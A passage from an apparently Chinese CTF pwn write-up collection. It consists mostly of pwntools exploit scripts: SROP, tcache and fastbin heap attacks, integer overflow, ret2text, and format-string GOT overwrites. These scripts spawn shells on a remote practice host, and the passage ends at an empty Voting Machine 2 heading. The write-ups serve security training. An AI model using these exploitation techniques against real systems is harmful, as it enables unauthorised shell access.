<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;ciscn_s_3&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;1.14.71.254&quot;</span>,<span class="number">28101</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;ciscn_s_3&#x27;</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">main = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">syscall_15 = <span class="number">0x0000000004004DA</span></span><br><span class="line">syscall = <span class="number">0x000000000400517</span> </span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(main))</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">stack_addr = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;stack:&quot;</span>+<span class="built_in">hex</span>(stack_addr))</span><br><span class="line">bin_sh = stack_addr - <span class="number">0x138</span></span><br><span class="line">farme = SigreturnFrame()</span><br><span class="line">farme.rax = <span class="number">59</span></span><br><span class="line">farme.rdi = bin_sh</span><br><span class="line">farme.rip = syscall</span><br><span class="line">farme.rsi = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0</span>)+p64(syscall_15)+p64(syscall)+<span class="built_in">bytes</span>(farme)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="CISCN-2021-lonelywolf"><a class="header-anchor" href="#CISCN-2021-lonelywolf">¶</a>[CISCN 2021] lonelywolf</h2>
<h3 id="题目考点-v20"><a class="header-anchor" href="#题目考点-v20">¶</a>题目考点</h3>
<pre><code>tcache attack
</code></pre>
<h3 id="exp-v20"><a class="header-anchor" href="#exp-v20">¶</a>exp</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;lonelywolf&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;1.14.71.254&quot;</span>,<span class="number">28134</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc-2.27.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span>(<span class="params">choice</span>):</span></span><br><span class="line">  p.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">  p.sendline(<span class="built_in">str</span>(choice))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,size</span>):</span></span><br><span class="line">  choice(<span class="number">1</span>)</span><br><span class="line">  p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">  p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">  p.recvuntil(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">  p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">  choice(<span class="number">2</span>)</span><br><span class="line">  p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">  p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">  p.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">  p.sendline(content)</span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">  choice(<span class="number">3</span>)</span><br><span class="line">  p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">  p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">  choice(<span class="number">4</span>)</span><br><span class="line">  p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">  p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span> </span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x28</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#add(0,0x78)</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">heap_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">0x260</span></span><br><span class="line">success(<span class="string">&quot;heap:&quot;</span> + <span class="built_in">hex</span>(heap_base))</span><br><span class="line">edit(<span class="number">0</span>,p64(heap_base+<span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x28</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x28</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0x7000000</span>))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x3ebca0</span></span><br><span class="line">success(<span class="string">&quot;libc:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x78</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x78</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x78</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(system))</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x78</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="BJDCTF-2020-babystack2-0"><a class="header-anchor" href="#BJDCTF-2020-babystack2-0">¶</a>[BJDCTF 2020]babystack2.0</h2>
<h3 id="题目考点-v21"><a class="header-anchor" href="#题目考点-v21">¶</a>题目考点</h3>
<p>整数溢出</p>
<h3 id="exp-v21"><a class="header-anchor" href="#exp-v21">¶</a>exp</h3>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;bjdbabys&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;1.14.71.254&quot;</span> , <span class="number">28006</span>)</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x000000000400726</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(backdoor)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;name:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;4294967285&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;name?&quot;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="GFCTF-2021-where-is-shell"><a class="header-anchor" href="#GFCTF-2021-where-is-shell">¶</a>[GFCTF 2021]where_is_shell</h2>
<h3 id="题目考点-v22"><a class="header-anchor" href="#题目考点-v22">¶</a>题目考点</h3>
<p>栈溢出</p>
<h3 id="解题思路-v5"><a class="header-anchor" href="#解题思路-v5">¶</a>解题思路</h3>
<p>题目给出了提示 “代码段是有r权限的的，所以字符串可以在代码段上”  ，因该是个ret2text , 但是却斌没有找到<code>sh</code>字符串，同时题目给出了一个tips，那么就需要到tips里面找字符串，最后在<code>0x400541</code>处找到了<code>\x24\x30</code>即<code>$0</code>,我们直接<code>system($0)</code>就能拿到shell</p>
<h3 id="exp-v22"><a class="header-anchor" href="#exp-v22">¶</a>exp</h3>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&quot;gfshell&quot;)</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;1.14.71.254&quot;</span>,<span class="number">28056</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;gfshell&quot;</span>)</span><br><span class="line"></span><br><span class="line">system = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">tips = <span class="number">0x400541</span></span><br><span class="line">ret = <span class="number">0x400416</span></span><br><span class="line">pop_rdi = <span class="number">0x4005e3</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(ret)+p64(pop_rdi)+p64(tips)+p64(system)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;it?&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="GKCTF-2020-domo"><a class="header-anchor" href="#GKCTF-2020-domo">¶</a>[GKCTF 2020]domo</h2>
<h3 id="题目考点-v23"><a class="header-anchor" href="#题目考点-v23">¶</a>题目考点</h3>
<pre><code>off by null
fastbin attack
</code></pre>
<h3 id="题目分析-v10"><a class="header-anchor" href="#题目分析-v10">¶</a>题目分析</h3>
<p>这道题打法很多，这里介绍一种最简单的打法，由于题目存在off by null 漏洞，我们可以利用其来构造堆重叠，然后就利用double free 来修改malloc_hook ，由于程序add edit free 功能都加入了检查，所以我们在修改后就不能使用，故可以利用scanf输入长度过长会触发malloc的特点来getshell</p>
<h3 id="exp-v23"><a class="header-anchor" href="#exp-v23">¶</a>exp</h3>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = remote(&#x27;1.14.71.254&#x27;,28078)</span></span><br><span class="line">p = process(<span class="string">&#x27;./domo&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./domo&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">one = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf02b4</span>,<span class="number">0xf1247</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chioce</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,data</span>):</span></span><br><span class="line">    chioce(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;\n&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&quot;\n&quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    chioce(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;\n&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index, data</span>):</span></span><br><span class="line">    chioce(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;\n&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&quot;\n&quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    chioce(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0xf0</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">add(<span class="number">0xf0</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x60</span>+p64(<span class="number">0x170</span>)) <span class="comment">#0</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0xf0</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x3c4d31</span></span><br><span class="line">success(<span class="string">&quot;libc: &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">one_gadget = libc_base + one[<span class="number">3</span>]</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(malloc_hook-<span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x13</span>+p64(one_gadget))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>*<span class="number">0x1001</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="BJDCTF-2020-babystack"><a class="header-anchor" href="#BJDCTF-2020-babystack">¶</a>[BJDCTF 2020]babystack</h2>
<h3 id="题目考点-v24"><a class="header-anchor" href="#题目考点-v24">¶</a>题目考点</h3>
<p>ret2text</p>
<h3 id="exp-v24"><a class="header-anchor" href="#exp-v24">¶</a>exp</h3>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&quot;ret2text&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;1.14.71.254&quot;</span>,<span class="number">28071</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;50&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x4006e6</span>))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="SWPU-2019-login"><a class="header-anchor" href="#SWPU-2019-login">¶</a>[SWPU 2019]login</h2>
<h3 id="题目考点-v25"><a class="header-anchor" href="#题目考点-v25">¶</a>题目考点</h3>
<p>不在栈上的格式化字符串</p>
<h3 id="解题思路-v6"><a class="header-anchor" href="#解题思路-v6">¶</a>解题思路</h3>
<p>题目有两种思路，一种是通过间接修改got表，另一种是通过第一次输入作为system的参数然后控制程序执行流去执行</p>
<h3 id="exp-v25"><a class="header-anchor" href="#exp-v25">¶</a>exp</h3>
<p>我自己的exp当时本地打通了，远程打不通，后来发现是由于一次写入了多个字节导致写入失败，后面发现的时候找不到了这里就放一个网上的exp,转自https://www.cnblogs.com/zhuangzhouQAQ/p/15703975.html</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;node4.buuoj.cn&#x27;,26202)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27-i386.so&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;name:&#x27;</span>,<span class="string">&#x27;aa&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;password:&#x27;</span>,<span class="string">&#x27;%15$p&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line"><span class="comment">#10 14</span></span><br><span class="line">__libc_start_main = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)-<span class="number">0xf1</span></span><br><span class="line">libc_base = __libc_start_main - libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base--&gt;&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;system--&gt;&#x27;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Try again!&#x27;</span>,<span class="string">&#x27;%6$p&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">strack_addr0 = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;strack_addr0--&gt;&#x27;</span>+<span class="built_in">hex</span>(strack_addr0))</span><br><span class="line"><span class="comment">#0xffda2994</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Try again!&#x27;</span>,<span class="string">&#x27;%10$p&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">strack_addr1 = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;strack_addr1--&gt;&#x27;</span>+<span class="built_in">hex</span>(strack_addr1))</span><br><span class="line"><span class="comment">#0xffd2a9a4</span></span><br><span class="line"><span class="comment">#print_got 0x0804b014</span></span><br><span class="line">cmd = <span class="string">&#x27;b *0x08048575\n&#x27;</span><span class="comment">#strack_addr1的值就是ebp第二的指针</span></span><br><span class="line"><span class="comment">#---------------将%14的偏移的地址处修改为print_got的地址----------</span></span><br><span class="line">payload = <span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x14</span>)+<span class="string">&#x27;c&#x27;</span>+<span class="string">&#x27;%10$hhn&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Try again!\n&#x27;</span>,payload) <span class="comment">#14</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>((strack_addr1 &amp; <span class="number">0xff</span>)+<span class="number">1</span>)+<span class="string">&#x27;c&#x27;</span>+<span class="string">&#x27;%6$hhn&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Try again!\n&#x27;</span>,payload1)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xb0</span>)+<span class="string">&#x27;c&#x27;</span>+<span class="string">&#x27;%10$hhn&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Try again!\n&#x27;</span>,payload2) <span class="comment">#b0</span></span><br><span class="line"></span><br><span class="line">payload3 = <span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>((strack_addr1 &amp; <span class="number">0xff</span>)+<span class="number">2</span>)+<span class="string">&#x27;c&#x27;</span>+<span class="string">&#x27;%6$hhn&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Try again!\n&#x27;</span>,payload3)</span><br><span class="line"></span><br><span class="line">payload4 = <span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x04</span>)+<span class="string">&#x27;c&#x27;</span>+<span class="string">&#x27;%10$hhn&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Try again!\n&#x27;</span>,payload4) <span class="comment">#04</span></span><br><span class="line"></span><br><span class="line">payload5 = <span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>((strack_addr1 &amp; <span class="number">0xff</span>)+<span class="number">3</span>)+<span class="string">&#x27;c&#x27;</span>+<span class="string">&#x27;%6$hhn&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Try again!\n&#x27;</span>,payload5)</span><br><span class="line"></span><br><span class="line">payload6 = <span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x08</span>)+<span class="string">&#x27;c&#x27;</span>+<span class="string">&#x27;%10$hhn&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Try again!\n&#x27;</span>,payload6) <span class="comment">#08</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#-------------------将%15的偏移处的地址覆盖为printf_got+1的地址-------------------------------</span></span><br><span class="line">strack_addr1 = strack_addr1 + <span class="number">4</span></span><br><span class="line">payload1 = <span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(strack_addr1 &amp; <span class="number">0xff</span>)+<span class="string">&#x27;c&#x27;</span>+<span class="string">&#x27;%6$hhn&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Try again!\n&#x27;</span>,payload1)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x15</span>)+<span class="string">&#x27;c&#x27;</span>+<span class="string">&#x27;%10$hhn&#x27;</span>  </span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Try again!\n&#x27;</span>,payload2) <span class="comment">#15</span></span><br><span class="line"></span><br><span class="line">payload3 = <span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>((strack_addr1 &amp; <span class="number">0xff</span>)+<span class="number">1</span>)+<span class="string">&#x27;c&#x27;</span>+<span class="string">&#x27;%6$hhn&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Try again!\n&#x27;</span>,payload3)</span><br><span class="line"></span><br><span class="line">payload4 = <span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xb0</span>)+<span class="string">&#x27;c&#x27;</span>+<span class="string">&#x27;%10$hhn&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Try again!\n&#x27;</span>,payload4) <span class="comment">#b0</span></span><br><span class="line"></span><br><span class="line">payload5 = <span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>((strack_addr1 &amp; <span class="number">0xff</span>)+<span class="number">2</span>)+<span class="string">&#x27;c&#x27;</span>+<span class="string">&#x27;%6$hhn&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Try again!\n&#x27;</span>,payload5)</span><br><span class="line"></span><br><span class="line">payload6 = <span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x04</span>)+<span class="string">&#x27;c&#x27;</span>+<span class="string">&#x27;%10$hhn&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Try again!\n&#x27;</span>,payload6) <span class="comment">#04</span></span><br><span class="line"></span><br><span class="line">payload7 = <span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>((strack_addr1 &amp; <span class="number">0xff</span>)+<span class="number">3</span>)+<span class="string">&#x27;c&#x27;</span>+<span class="string">&#x27;%6$hhn&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Try again!\n&#x27;</span>,payload7)</span><br><span class="line"></span><br><span class="line">payload8 = <span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x08</span>)+<span class="string">&#x27;c&#x27;</span>+<span class="string">&#x27;%10$hhn&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Try again!\n&#x27;</span>,payload8) <span class="comment">#08</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------修改为system的地址----------------------------</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(system &amp; <span class="number">0xff</span>)+<span class="string">&#x27;c&#x27;</span>+<span class="string">&#x27;%14$hhn&#x27;</span></span><br><span class="line"></span><br><span class="line">payload += <span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(((system &amp; <span class="number">0xffff00</span>)&gt;&gt;<span class="number">8</span>)-<span class="number">0x10</span>)+<span class="string">&#x27;c&#x27;</span>+<span class="string">&#x27;%15$hn&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(((system &amp; <span class="number">0xffff00</span>)&gt;&gt;<span class="number">8</span>)-<span class="number">0x10</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Try again!\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">time.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gdb.attach(p,cmd)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="watevrCTF-2019-Voting-Machine-1"><a class="header-anchor" href="#watevrCTF-2019-Voting-Machine-1">¶</a>[watevrCTF 2019]Voting Machine 1</h2>
<h3 id="题目考点-v26"><a class="header-anchor" href="#题目考点-v26">¶</a>题目考点</h3>
<p>栈溢出</p>
<h3 id="exp-v26"><a class="header-anchor" href="#exp-v26">¶</a>exp</h3>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;1.14.71.254&quot;</span>, <span class="number">28061</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">2</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x000000000400807</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="watevrCTF-2019-Voting-Machine-2"><a class="header-anchor" href="#watevrCTF-2019-Voting-Machine-2">¶</a>[watevrCTF 2019]Voting Machine 2</h2>
<h3 id="题目考点-v27"><a class="header-anchor" href="#题目考点-v27">¶</a>题目考点</h3>
<p>格式化字符串任意内存覆盖</p>
<h3 id="exp-v27"><a class="header-anchor" href="#exp-v27">¶</a>exp</h3>
